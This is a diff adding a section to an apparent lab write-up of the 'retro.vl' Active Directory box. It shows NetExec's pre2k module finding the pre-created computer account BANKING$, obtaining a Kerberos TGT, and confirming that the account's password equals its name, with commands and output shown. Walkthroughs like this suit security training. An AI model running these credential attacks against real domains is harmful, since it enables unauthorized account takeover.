@@ -288,3 +288,46 @@ Best
 James
 ```
 
+<br />
+
+This time, is a personal message, from James to Thomas. In that message, James is advicing Thomas about a old pre created account related to a banking software that they need to clean up.
+
+
+### Pre-Windows 2000:
+
+<br />
+
+When a new computer account is configured as "pre-Windows 2000 computer account", its password is set based on its name. This type of account can be discovered using a `NetExec` module called `pre2k`.
+
+To use it we only need to run it like the following:
+
+<br />
+
+```bash
+❯ nxc ldap retro.vl -u trainee -p trainee -M pre2k
+LDAP        10.129.28.100   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.28.100   389    DC               [+] retro.vl\trainee:trainee 
+PRE2K       10.129.28.100   389    DC               Pre-created computer account: BANKING$
+PRE2K       10.129.28.100   389    DC               [+] Found 1 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
+PRE2K       10.129.28.100   389    DC               [+] Successfully obtained TGT for banking@retro.vl
+PRE2K       10.129.28.100   389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache
+```
+
+<br />
+
+The output confirms that there is an available pre created computer account: `BANKING$`
+
+We can confirm that this computer account is using its name as password running:
+
+<br />
+
+```bash
+❯ nxc smb retro.vl -u 'BANKING$' -p banking
+SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.28.100   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
+```
+
+<br />
+
+The `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` message confirms it.
+
